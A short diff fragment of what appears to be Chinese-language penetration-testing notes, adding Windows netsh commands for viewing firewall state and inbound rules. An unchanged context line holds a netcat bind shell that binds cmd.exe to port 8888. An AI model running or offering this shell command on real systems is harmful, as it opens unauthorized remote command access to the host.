@@ -8,3 +8,10 @@
 ```
 nc -lvp 8888 -e c:\windows\system32\cmd.exe 
 ```
+查看防火墙状态：
+```
+netsh firewall show state
+```
+```
+netsh advfirewall firewall show rule name=all dir=in type=dynamic
+```
